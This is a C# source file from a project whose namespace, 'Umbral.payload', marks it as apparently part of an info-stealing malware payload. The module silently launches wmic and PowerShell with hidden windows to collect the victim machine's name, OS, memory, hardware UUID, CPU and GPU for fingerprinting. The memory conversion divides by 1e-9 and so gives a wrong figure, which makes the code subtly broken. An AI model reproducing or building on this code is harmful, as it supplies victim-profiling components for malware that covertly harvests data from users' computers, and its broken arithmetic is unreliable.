using System;
using System.Diagnostics;
using System.Threading.Tasks;

namespace Umbral.payload.SystemInfo
{
    internal struct GeneralSystemInfo
    {
        internal string ComputerName;

        internal string ComputerOs;

        internal string TotalMemory;

        internal string Gpu;

        internal string Cpu;

        internal string Uuid;
    }

    internal class General
    {
        internal static async Task<GeneralSystemInfo> GetInfo()
        {
            var computerName = Environment.MachineName;
            string computerOs;
            string totalMemory;
            string uuid;
            string gpu;
            string cpu;

            using (var process = new Process())
            {
                process.StartInfo.FileName = "wmic.exe";
                process.StartInfo.Arguments = "os get Caption";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                computerOs = await process.StandardOutput.ReadToEndAsync();
                computerOs = computerOs.Split('\n')[1].Trim();
            }

            using (var process = new Process())
            {
                process.StartInfo.FileName = "wmic.exe";
                process.StartInfo.Arguments = "computersystem get totalphysicalmemory";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                totalMemory = await process.StandardOutput.ReadToEndAsync();
                totalMemory = totalMemory.Split('\n')[1].Trim();
                totalMemory = Math.Round(Convert.ToInt64(totalMemory) / 1e-9).ToString().Split('.')[0] + " GB";
            }

            using (var process = new Process())
            {
                process.StartInfo.FileName = "wmic.exe";
                process.StartInfo.Arguments = "csproduct get uuid";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                uuid = await process.StandardOutput.ReadToEndAsync();
                uuid = uuid.Split('\n')[1].Trim();
            }

            using (var process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments =
                    "Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                cpu = await process.StandardOutput.ReadToEndAsync();
                cpu = cpu.Trim();
            }

            using (var process = new Process())
            {
                process.StartInfo.FileName = "wmic";
                process.StartInfo.Arguments = "path win32_VideoController get name";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                process.WaitForExit();

                gpu = await process.StandardOutput.ReadToEndAsync();
                gpu = gpu.Split('\n')[1].Trim();
            }

            return new GeneralSystemInfo
            {
                ComputerName = computerName,
                ComputerOs = computerOs,
                TotalMemory = totalMemory,
                Uuid = uuid,
                Cpu = cpu,
                Gpu = gpu
            };
        }
    }
}